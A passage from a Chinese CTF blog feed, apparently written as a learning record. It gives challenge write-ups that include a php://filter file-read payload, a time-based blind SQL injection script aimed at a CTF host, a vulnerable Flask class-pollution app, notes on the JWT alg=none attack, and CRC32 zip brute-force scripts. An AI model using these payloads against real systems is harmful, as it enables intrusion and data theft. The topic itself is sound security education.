ç±»æä¾›äº†ä¸€ç§é¢å‘å¯¹è±¡çš„æ–¹å¼æ¥å¤„ç†æ–‡ä»¶ï¼Œæ”¯æŒæµå¼å¤„ç†ï¼Œéå¸¸é€‚åˆæ“ä½œå¤§æ–‡ä»¶</p><p>?K&#x3D;DirectoryIterator&amp;W&#x3D;&#x2F;secret&#x2F;ä½¿ç”¨å…¶è¿›è¡Œéå†ï¼Œå¯ä»¥å‘ç°f11444g.phpæ–‡ä»¶</p><p>ä¼ªåè®®è¯»å–æ–‡ä»¶å†…å®¹</p><p>J&#x3D;SplFileObject&amp;H&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;secret&#x2F;f11444g.php</p><h3 id="only-one-sql"><a href="#only-one-sql" class="headerlink" title="only one sql"></a>only one sql</h3><p>sqlæ—¶é—´ç›²æ³¨</p><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sql&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/select|;|@|\n/i&#x27;</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;ä½ çŸ¥é“çš„ï¼Œä¸å¯èƒ½æœ‰sqlæ³¨å…¥&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&quot;|\$|`|\\\\/i&#x27;</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;ä½ çŸ¥é“çš„ï¼Œä¸å¯èƒ½æœ‰RCE&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag in ctf.flag</span></span><br><span class="line"><span class="variable">$query</span> = <span class="string">&quot;mysql -u root -p123456 -e \&quot;use ctf;select &#x27;æ²¡æœ‰selectï¼Œè®©ä½ æ‰§è¡Œä¸€å¥åˆå¦‚ä½•&#x27;;&quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$query</span>); æ²¡æœ‰selectï¼Œè®©ä½ æ‰§è¡Œä¸€å¥åˆå¦‚ä½• æ²¡æœ‰selectï¼Œè®©ä½ æ‰§è¡Œä¸€å¥åˆå¦‚ä½•</span><br></pre></td></tr></table></figure><p>éƒ¨åˆ†å…³é”®è¯è¢«ç¦ç”¨ï¼Œåªèƒ½æ‰§è¡Œä¸€å¥sqlè¯­å¥</p><p>show tables;    å¯ä»¥å‘ç°æœ‰2å¼ è¡¨Tables_in_ctf flag</p><p><img src="/img/image-20240919181352656.png" alt="image-20240919181352656"></p><p>show columns from flag     #æŸ¥è¯¢è¡¨ä¸­æ‰€æœ‰å­—æ®µ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Field Type Null Key Default Extra</span><br><span class="line"></span><br><span class="line">id varchar(300) YES NULL </span><br><span class="line"></span><br><span class="line">data varchar(300) YES NULL</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ—¶é—´ç›²æ³¨è„šæœ¬æ¥æŸ¥è¯¢flagå³å¯</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">sqlstr = string.ascii_lowercase + string.digits + <span class="string">&#x27;-&#x27;</span> + <span class="string">&quot;&#123;&#125;&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://challenge.basectf.fun:23963/?sql=show%20columns%20from%20flag&quot;</span></span><br><span class="line">end=<span class="string">&quot;%25%27%20and%20sleep(5)&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> sqlstr:</span><br><span class="line">        payload = url +flag+ c + end</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(payload,timeout=<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(flag+c)</span><br><span class="line">            flag+=c</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="åœ£é’¥ä¹‹æˆ˜1-0"><a href="#åœ£é’¥ä¹‹æˆ˜1-0" class="headerlink" title="åœ£é’¥ä¹‹æˆ˜1.0"></a>åœ£é’¥ä¹‹æˆ˜1.0</h3><p>&#x2F;readè¯»å–æºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">J1ngHongè¯´ï¼šä½ æƒ³read flagå—ï¼Ÿ</span><br><span class="line">é‚£ä¹ˆåœ£é’¥ä¹‹å…‰å¿…å°†é˜»æ­¢ä½ ï¼</span><br><span class="line">ä½†æ˜¯å°å°çš„æºç æ²¡äº‹ï¼Œå› ä¸ºä½ ä¹Ÿè¯»ä¸åˆ°flag(ä¹)</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_json</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        json.loads(data)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/static/index.html&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Read</span>():</span><br><span class="line">    file = <span class="built_in">open</span>(__file__, encoding=<span class="string">&quot;utf-8&quot;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;J1ngHongè¯´ï¼šä½ æƒ³read flagå—ï¼Ÿ</span></span><br><span class="line"><span class="string">é‚£ä¹ˆåœ£é’¥ä¹‹å…‰å¿…å°†é˜»æ­¢ä½ ï¼</span></span><br><span class="line"><span class="string">ä½†æ˜¯å°å°çš„æºç æ²¡äº‹ï¼Œå› ä¸ºä½ ä¹Ÿè¯»ä¸åˆ°flag(ä¹)</span></span><br><span class="line"><span class="string"><span class="subst">&#123;file&#125;</span></span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pollute&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Pollution</span>():</span><br><span class="line">    <span class="keyword">if</span> request.is_json:</span><br><span class="line">        merge(json.loads(request.data),instance)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;J1ngHongè¯´ï¼šé’¥åŒ™åœ£æ´æ— æš‡ï¼Œæ— äººå¯ä»¥æ±¡æŸ“ï¼&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;J1ngHongè¯´ï¼šåœ£é’¥æš—æ·¡äº†ä¸€ç‚¹ï¼Œä½ å±…ç„¶æ±¡æŸ“æˆåŠŸäº†ï¼Ÿ&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><h3 id="NO-JWT"><a href="#NO-JWT" class="headerlink" title="NO JWT"></a>NO JWT</h3><p>JWTè®¤è¯æ”»å‡»è¯¦ç»†è§£ç­”:</p><p>1.JWTçš„ç®€ä»‹</p><p>JWTå…¨ç§°ä¸ºjson web token å°†jsonå¯¹è±¡ä½œä¸ºè½½ä½“è¿›è¡Œä¼ è¾“ä¿¡æ¯ï¼Œé€šå¸¸ç”¨äºèº«ä»½è®¤è¯å’Œä¿¡æ¯äº¤æ¢ã€‚JWTå¯ä»¥ä½¿ç”¨å¯†é’¥(HMACç®—æ³•)æˆ–è€…ä½¿ç”¨RSAæˆ–ECDSAçš„å…¬é’¥&#x2F;ç§é’¥å¯¹è‡ªèº«è¿›è¡Œç­¾å</p><p>2ï¼šJWTçš„æ ¼å¼</p><p>æ¯å½“ç”¨æˆ·è®¿é—®ç«™ç‚¹ä¸­çš„èµ„æºæ—¶ï¼Œå¯¹åº”çš„è¯·æ±‚å¤´è®¤è¯é»˜è®¤ä¸ºAuthorization:jwt JWTä»¤ç‰Œè®¤è¯ä»¥eyjå¼€å¤´</p><p>JWTçš„æ•°æ®å¤´éƒ¨å¦‚ä¸‹ï¼š</p><p>JWTçš„æ•°æ®åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼šå¤´éƒ¨(header),æœ‰æ•ˆè½½è·(Payload),ç­¾å(Signature)</p><p>ä¸‰ä¸ªéƒ¨åˆ†ä»¥è‹±æ–‡é€—å·éš”å¼€ï¼ŒJWTçš„å†…å®¹ä»¥base64è¿›è¡Œç¼–ç </p><p>ä¸‹é¢ä¸¾ä¸ªä¾‹å­ï¼š</p><p>(1):å¤´éƒ¨ä¿¡æ¯åŒ…å«äº†JWTçš„é…ç½®æ–¹é¢ï¼Œä¾‹å¦‚ç­¾åç®—æ³•(alg)ï¼Œä»¤ç‰Œç±»å‹(JWT)å’ŒåŠ å¯†ç®—æ³•(alg)æˆ–è€…ç®—æ³•ä½¿ç”¨çš„å¯†é’¥æ–‡ä»¶</p><p>Head:eyJraWQiOiJrZXlzLzNjM2MyZWExYzNmMTEzZjY0OWRjOTM4OWRkNzFiODUxIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ</p><p>{â€œkidâ€:â€keys&#x2F;3c3c2ea1c3f113f649dc9389dd71b851â€,â€typâ€:â€JWTâ€,â€algâ€:â€RS256â€}</p><p>(2):æœ‰æ•ˆè½½è·</p><p>æœ‰æ•ˆè½½è·ç”¨äºå­˜å‚¨ç”¨æˆ·çš„æ•°æ®ï¼Œä¾‹å¦‚ç”¨æˆ·å(test123)</p><p>payloadï¼šeyJzdWIiOiJkdWJoZTEyMyJ9</p><p>{â€œsubâ€:â€dubhe123â€}</p><p>(3):ç­¾å</p><p>Signature éœ€è¦ä½¿ç”¨ç¼–ç åçš„headerå’Œpayloadä»¥åŠæˆ‘ä»¬æä¾›çš„ä¸€ä¸ªå¯†é’¥ï¼Œç„¶åä½¿ç”¨headerä¸­æŒ‡å®šçš„ç­¾åç®—æ³•é€šå¸¸æ˜¯RS256(RSAéå¯¹ç§°åŠ å¯†å’Œç§é’¥ç­¾å)å’ŒHS256(HMAC SHA256å¯¹ç§°åŠ å¯†)ç®—æ³•è¿›è¡Œç­¾åï¼Œç­¾åçš„ä½œç”¨æ˜¯ä¿è¯jwtæ²¡æœ‰è¢«ç¯¡æ”¹è¿‡</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªç”¨HS256ç”ŸæˆJw&#x3D;WTçš„ä»£ç ä¾‹å­</p><p>HMACSHA256(base64Encode(header) + â€œ.â€ + base64urlEncode(payload),secret)</p><p>Signature:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XicP4pq_WIF2bAVtPmAlWIvAUad_eeBhDOQe2MXwHrE8a7930LlfQq1lFqBs0wLMhht6Z9BQXBRos9jvQ7eumEUFWFYKRZfu9POTOEE79wxNwTxGdHc5VidvrwiytkRMtGKIyhbv68duFPI68Qnzh0z0M7t5LkEDvNivfOrxdxwb7IQsAuenKzF67Z6UArbZE8odNZAA9IYaWHeh1b4OUG0OPM3saXYSG-Q1R5X_5nlWogHHYwy2kD9v4nk1BaQ5kHJIl8B3Nc77gVIIVvzI9N_klPcX5xsuw9SsUfr9d99kaKyMUSXxeiZVM-7os_dw3ttz2f-TJSNI0DYprHHLFw</span><br></pre></td></tr></table></figure><p>JWTå¸¸è§å®‰å…¨é—®é¢˜</p><p>1ï¼šç­¾åç®—æ³•å¯è¢«ä¿®æ”¹ä¸ºnone(CVE-2015-9235)</p><p>JWTæ”¯æŒç®—æ³•è®¾å®šä¸ºâ€œNoneâ€,å¦‚æœâ€œalgâ€å­—æ®µè®¾ä¸ºâ€œNoneâ€,é‚£ä¹ˆç­¾åä¼šè¢«ç½®ç©ºï¼Œè¿™æ ·çš„ä»»ä½•tokenéƒ½æ˜¯æœ‰æ•ˆçš„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>moectf</title>
      <link href="/2024/09/04/moectf/"/>
      <url>/2024/09/04/moectf/</url>
      
        <content type="html"><![CDATA[<h3 id="è§£ä¸å¼€çš„å‹ç¼©åŒ…"><a href="#è§£ä¸å¼€çš„å‹ç¼©åŒ…" class="headerlink" title="è§£ä¸å¼€çš„å‹ç¼©åŒ…"></a>è§£ä¸å¼€çš„å‹ç¼©åŒ…</h3><p>é¢˜ç›®æœ‰ç‚¹æ„æ€ï¼Œ999å±‚å‹ç¼©åŒ…ï¼Œä¹Ÿå°±æ˜¯ç‚¹999ä¸‹ï¼Œç›´æ¥ä½¿ç”¨è„šæœ¬è§£å‹å§</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_zip</span>(<span class="params">zip_file, extract_to</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(zip_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">            zip_ref.extractall(extract_to)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error extracting <span class="subst">&#123;zip_file&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_all</span>(<span class="params">zip_file, output_dir</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(output_dir):</span><br><span class="line">        os.makedirs(output_dir)</span><br><span class="line"></span><br><span class="line">    success = extract_zip(zip_file, output_dir)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> success:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Iterate over the files extracted</span></span><br><span class="line">    extracted_files = [os.path.join(output_dir, f) <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(output_dir)]</span><br><span class="line">    <span class="keyword">while</span> extracted_files:</span><br><span class="line">        new_extracted_files = []</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> extracted_files:</span><br><span class="line">            <span class="keyword">if</span> zipfile.is_zipfile(file):</span><br><span class="line">                <span class="comment"># New directory to extract this zip file</span></span><br><span class="line">                new_dir = os.path.join(output_dir, os.path.basename(file).replace(<span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(new_dir):</span><br><span class="line">                    os.makedirs(new_dir)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> extract_zip(file, new_dir):</span><br><span class="line">                    new_extracted_files.extend([os.path.join(new_dir, f) <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(new_dir)])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> new_extracted_files:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;No more zip files to extract.&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        extracted_files = new_extracted_files</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    zip_file = <span class="string">&#x27;999.zip&#x27;</span></span><br><span class="line">    output_dir = <span class="string">&#x27;D:\pythonå­¦ä¹ \å‹ç¼©åŒ…&#x27;</span></span><br><span class="line">    extract_all(zip_file, output_dir)</span><br></pre></td></tr></table></figure><p>CRC32ç¢°æ’2byteçˆ†ç ´</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.8</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">title</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+-----------------------------------------------------+&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+              æ¸Šé¾™Secå®‰å…¨å›¢é˜ŸCTFå·¥å…·åŒ…               +&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+              å›¢é˜Ÿå…¬å¼€QQç¾¤ï¼š877317946                +&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+               Title: CRC-Tools_2Byte                +&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+      python3 2Byte-CRC.py --&gt; 2Byte &gt;&gt;&gt; Demo.zip    +&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+                ä½œè€…ï¼šæ›¾å“¥ï¼ˆAabyssZGï¼‰               +&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+                 ç‰ˆæœ¬ï¼šV1.3å•æ–‡ä»¶ç‰ˆ                  +&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+-----------------------------------------------------+&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">FileRead</span>(<span class="params">zipname</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f =<span class="built_in">open</span>(zipname)                               <span class="comment">#æ‰“å¼€ç›®æ ‡æ–‡ä»¶</span></span><br><span class="line">        f.close()</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;æœªæ‰¾åˆ°åŒç›®å½•ä¸‹çš„å‹ç¼©åŒ…æ–‡ä»¶&quot;</span> + zipname) <span class="comment">#å¦‚æœæœªæ‰¾åˆ°æ–‡ä»¶ï¼Œè¾“å‡ºé”™è¯¯</span></span><br><span class="line">        <span class="keyword">return</span>                                         <span class="comment">#é€€å‡ºçº¿ç¨‹ï¼Œè¿›è¡Œè¯¦ç»†æŠ¥é”™</span></span><br><span class="line">    <span class="keyword">except</span> PermissionError:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;æ— æ³•è¯»å–ç›®æ ‡å‹ç¼©åŒ…ï¼ˆæ— æƒé™è®¿é—®ï¼‰&quot;</span>)     <span class="comment">#å¦‚æœå‘ç°ç›®æ ‡æ–‡ä»¶æ— æƒé™ï¼Œè¾“å‡ºé”™è¯¯</span></span><br><span class="line">        <span class="keyword">return</span>                                         <span class="comment">#é€€å‡ºçº¿ç¨‹ï¼Œè¿›è¡Œè¯¦ç»†æŠ¥é”™</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">TwoByte</span>(<span class="params">zipname</span>):</span><br><span class="line">    zip_url = <span class="string">&quot;./&quot;</span> + zipname</span><br><span class="line">    file_zip = zipfile.ZipFile(zip_url)    <span class="comment">#ç”¨zipfileè¯»å–æŒ‡å®šçš„å‹ç¼©åŒ…æ–‡ä»¶</span></span><br><span class="line">    name_list = file_zip.namelist()        <span class="comment">#ä½¿ç”¨ä¸€ä¸ªåˆ—è¡¨ï¼Œè·å–å¹¶å­˜å‚¨å‹ç¼©åŒ…å†…æ‰€æœ‰çš„æ–‡ä»¶å</span></span><br><span class="line">    crc_list = []</span><br><span class="line">    crc32_list = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+--------------éå†æŒ‡å®šå‹ç¼©åŒ…çš„CRCå€¼----------------+&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> name_list:</span><br><span class="line">        name_message = file_zip.getinfo(name)</span><br><span class="line">        crc_list.append(name_message.CRC)</span><br><span class="line">        crc32_list.append(<span class="built_in">hex</span>(name_message.CRC))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[OK] &#123;0&#125;: &#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(name,<span class="built_in">hex</span>(name_message.CRC)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+-------------å¯¹è¾“å‡ºçš„CRCå€¼è¿›è¡Œç¢°æ’-----------------+&#x27;</span>)</span><br><span class="line">    comment = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    chars = string.printable</span><br><span class="line">    <span class="keyword">for</span> crc_value <span class="keyword">in</span> crc_list:</span><br><span class="line">        <span class="keyword">for</span> char1 <span class="keyword">in</span> chars:</span><br><span class="line">            <span class="keyword">for</span> char2 <span class="keyword">in</span> chars:</span><br><span class="line">                res_char = char1 + char2                        <span class="comment">#è·å–ä»»æ„2Byteå­—ç¬¦</span></span><br><span class="line">                thicken_crc = binascii.crc32(res_char.encode()) <span class="comment">#è·å–ä»»æ„2Byteå­—ç¬¦ä¸²çš„CRC32å€¼</span></span><br><span class="line">                calc_crc = thicken_crc &amp; <span class="number">0xffffffff</span>             <span class="comment">#å°†ä»»æ„2Byteå­—ç¬¦ä¸²çš„CRC32å€¼ä¸0xffffffffè¿›è¡Œä¸è¿ç®—</span></span><br><span class="line">                <span class="keyword">if</span> calc_crc == crc_value:                       <span class="comment">#åŒ¹é…ä¸¤ä¸ªCRC32å€¼</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;[Success] &#123;&#125;: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(crc_value),res_char))</span><br><span class="line">                    comment += res_char</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+-----------------CRCç¢°æ’ç»“æŸï¼ï¼ï¼-----------------+&#x27;</span>)</span><br><span class="line">    crc32_list = <span class="built_in">str</span>(crc32_list)</span><br><span class="line">    crc32_list = crc32_list.replace(<span class="string">&#x27;\&#x27;&#x27;</span> , <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;è¯»å–æˆåŠŸï¼Œå¯¼å‡ºCRCåˆ—è¡¨ä¸ºï¼š&quot;</span> + crc32_list)                     <span class="comment">#å¯¼å‡ºCRCåˆ—è¡¨</span></span><br><span class="line">    <span class="keyword">if</span> comment:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;CRCç¢°æ’æˆåŠŸï¼Œç»“æœä¸º: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(comment))                  <span class="comment">#è¾“å‡ºCRCç¢°æ’ç»“æœ</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;CRCç¢°æ’æ²¡æœ‰ç»“æœï¼Œè¯·æ£€æŸ¥å‹ç¼©åŒ…å†…æ–‡ä»¶æ˜¯å¦ä¸º2Byteï¼ï¼ï¼&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    title()</span><br><span class="line">    zipname = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;è¯·è¾“å…¥å‹ç¼©åŒ…åå­—ï¼š\n2Byte &gt;&gt;&gt; &quot;</span>))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> zipname:</span><br><span class="line">            FileRead(zipname)</span><br><span class="line">            TwoByte(zipname)</span><br><span class="line">    <span class="keyword">except</span> BaseException <span class="keyword">as</span> e:</span><br><span class="line">        err = <span class="built_in">str</span>(e)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;è„šæœ¬è¯¦ç»†æŠ¥é”™ï¼š&#x27;</span> + err)</span><br></pre></td></tr></table></figure><p><img src="/img/1725444774449-1.png" alt="img"></p><p>å¯†ç ä¸º*m:#P7j0</p><p>moectf{af9c688e-e0b9-4900-879c-672b44c550ea}</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kalié…ç½®ç½‘ç»œ</title>
      <link href="/2024/08/01/kali%E9%85%8D%E7%BD%AE%E7%BD%91%E7%BB%9C/"/>
      <url>/2024/08/01/kali%E9%85%8D%E7%BD%AE%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä¹‹å‰ä¸€ç›´æƒ³xshellè¿æ¥æˆ‘çš„kali,å¯ä»¥å‡å°‘ä¸€äº›éº»çƒ¦äº‹ï¼Œç»“æœä¸€ç›´æœ¬åœ°pingä¸åŒæˆ‘çš„è™šæ‹Ÿæœºipï¼Œè™½ç„¶æˆ‘ä½¿ç”¨çš„æ˜¯netæ¨¡å¼ï¼Œä½†æ˜¯æˆ‘è™šæ‹Ÿæœºç½‘å¡vm8éƒ½æ²¡æœ‰ï¼Œæˆ‘ä¹Ÿæ˜¯æœäº†ï¼Œå°±æ˜¯ä¹‹å‰æˆ‘å®‰è£…çš„ç¡¬ç›˜æŠ¥åºŸäº†ï¼Œvmè™šæ‹Ÿæœºæ²¡åˆ é™¤å¹²å‡€ï¼Œè¿™é‡Œå¯ä»¥é‡æ–°å®‰è£…vmè™šæ‹Ÿæœº</p><p>æ¨èåšå®¢:å¦‚ä½•å½»åº•åˆ é™¤vmè™šæ‹Ÿæœº</p><p><a href="https://blog.csdn.net/Wysnbb/article/details/123996480">https://blog.csdn.net/Wysnbb/article/details/123996480</a></p><p>åšå®¢æŒºå¥½çš„ï¼Œä¸¥æ ¼æŒ‰ç…§ä¸Šé¢æ¥æ²¡æœ‰é—®é¢˜ï¼Œç»†èŠ‚é—®é¢˜å¯ä»¥çœ‹çœ‹è¯„è®º</p><p>è¿™é‡Œä½¿ç”¨æ¡¥æ¥æ¨¡å¼æ¥</p><p><img src="/img/1722475245419-8.png" alt="img"></p><p>æŸ¥çœ‹ä¸€ä¸‹æˆ‘ä»¬çš„wifiè¿æ¥RZ608å•¥çš„ï¼Œè®°ä½è¿™ä¸ªç§°å·ï¼ˆä¹‹å‰æ˜¯æ²¡æœ‰vm1å’Œ8çš„ï¼‰</p><p><img src="/img/1722475245413-1.png" 